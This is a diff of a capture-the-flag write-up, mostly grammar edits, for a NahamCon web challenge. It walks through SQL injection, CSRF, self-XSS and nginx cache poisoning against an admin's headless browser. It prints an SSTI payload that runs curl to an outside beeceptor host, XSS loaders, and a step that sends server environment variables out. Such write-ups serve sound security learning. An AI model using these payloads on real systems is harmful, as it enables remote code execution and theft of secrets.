@@ -2,7 +2,7 @@
 The challenge was an updated version of the **AgentTester** challenge, thats why i'll only summarize some of the already known steps. The challenges differ because the passwords are hashed now and we can't just login anymore.
 
 # Challenge Setup
-The websites provides a input form which lets you test a useragent.
+The websites provides an input form which lets you test a user agent.
 The functionality is hidden behind a login but we can register new accounts. 
 Since we have the source code we know that the flag is stored inside an environment variable.
 
@@ -10,7 +10,7 @@ We also know from the previous challenge that we can gain code execution once we
 
 # Issueing arbitrary requests
 The site uses puppeteer to open a browser and issue requests to google.com with our selected user-agent.
-If you solved the first challenge you know there is a sql-injection reachable via the user-agent input.
+If you solved the first challenge then you know that there is a sql-injection reachable via the user-agent input.
 
 ```python
   query = db.session.execute("SELECT userAgent, url FROM uAgents WHERE userAgent = %s'" % uAgent).fetchone()
@@ -41,17 +41,17 @@ but there is nothing interesting to see since the cookie has a domain set and it
     'httpOnly': true
   }];
 ```
-We have blind SSRF which isn't of any use currently. :(
+We have blind SSRF which isn't currently of any use. :(
 
 # Failed attempts
 I tried letting the puppeteer browser (which has the admin cookie set) visit various pages but found nothing of use.
-After a while i noticed that since its headless browser and not just a request that is issued that 
-i can let the admin visit a site that i created and execute arbitrary javascript on my page.
+After a while I noticed that since its headless browser and not just a request that is issued that 
+i can let the admin visit a site that I created and execute arbitrary javascript on my page.
 
 When thinking of client side attacks the first thing that comes to mind is XSS.
-So i tried looking for reflected xss in the success/error parameters of the login page, but no luck since jinja escapes malicious characters.
+So I tried looking for reflected xss in the success/error parameters of the login page, but no luck since jinja escapes malicious characters.
 
-The second thing i thought of was **CSRF**. I can simply let send a post request to the **/debug** endpoint and gain code execution.
+The second thing I thought of was **CSRF**. I can simply let send a post request to the **/debug** endpoint and gain code execution.
 I know that CORS blocks the response of the post call but I could still exfiltrate data using curl.
 
 ```javascript
@@ -63,11 +63,11 @@ I know that CORS blocks the response of the post call but I could still exfiltra
     first.send("code={{request.application.__globals__.__builtins__.__import__('os').popen('curl https://ghjkl.free.beeceptor.com').read()}}");
 ```
 
-After trying for some time and different variations of the payload i admitted to myself that this wasn't the correct route and took a break.
+After trying for some time and different variations of the payload I admitted to myself that this wasn't the correct route and took a break.
 I don't exactly know why it faild either flask or chromes same-site per default.
 
 # Self XSS + Web Cache Poisoning
-The next day i decided look at the **nginx.conf**.
+The next day I decided look at the **nginx.conf**.
 The thing that caught my attention almost immediatly was:
 ```proxy_cache_key $request_uri$http_user_agent;```
 
@@ -78,17 +78,17 @@ Since the cache key consists of **url + useragent** every request to a profile u
 
 The first thing I tried was letting the admin visit the url **http://challenge.nahamcon.com:31220/profile/1** (1 is the admin id) with **user-agent: asdf**
 
-Then i issued the a request to the same url with the same user-agent.
+Then I issued the a request to the same url with the same user-agent.
 
 ```curl -H "Cookie: auth2=eyJpZCI6Mn0.YE3nwQ.1VKe6fgmTWvSNy5B-VWTRlGQN4M" http://challenge.nahamcon.com:31220/profile/1 -A asdf```
 
-It worked i got the cached response with the admin email: admin@admin.com and about field, but the profile does not contain anything interesting to work with.
+It worked I got the cached response with the admin email: admin@admin.com and about field, but the profile does not contain anything interesting to work with.
 
-After a while I came to the conclusion that i can let the admin visit the cached version of my own profile and I began searching for an Self-XSS.
-The first and spimplest payload i tried worked: 
+After a while I came to the conclusion that I can let the admin visit the cached version of my own profile and I began searching for an Self-XSS.
+The first and spimplest payload I tried worked: 
 ```"><script>alert(1)</script>```
 
-Now i knew what i had to do: 
+Now I knew what I had to do: 
 - Xss myself and send a request to the debug endpoint
 - Let nginx cache the site with a specific user agent
 - Let the admin visit my profile with that user agent
@@ -128,8 +128,8 @@ I base64 encoded the xss payload went to my profile and inserted:
 
 ```"><script>eval(atob("base64_encoded_payload"))</script>```
 
-I fiddled around with the xss payload for a while till the request to the debug endpoint worked correctly in my browser and I decided to use fetch (because i was too stupid to get the XMLHttpRequest post to work :/ ). 
-The first success was when i saw a request on my beeceptor url on the /result endpoint, but the response html was just the string "Safe Debug".
+I fiddled around with the xss payload for a while till the request to the debug endpoint worked correctly in my browser and I decided to use fetch (because I was too stupid to get the XMLHttpRequest post to work :/ ). 
+The first success was when I saw a request on my beeceptor url on the /result endpoint, but the response html was just the string "Safe Debug".
 
 ## Final xss payload
 ```javascript
@@ -161,6 +161,6 @@ Enter input for user Agent Test:
 
 After sending this request he puppeteer browser starts visits my profile with the user-agent and gets serverd the cached xss payload.
 
-After a few seconds I saw a request to the /result endpoint on my beeceptor endpoint and I was so happy when i saw that the body contained all the environment variables now just look for the **CHALLENGE_FLAG** variable to get the flag.
+After a few seconds I saw a request to the /result endpoint on my beeceptor endpoint and I was so happy when I saw that the body contained all the environment variables now just look for the **CHALLENGE_FLAG** variable to get the flag.
 
 This was my first writeup so if you have any questions or suggestions you can reach me on twitter [@alkiiis](https://twitter.com/alkiiis)
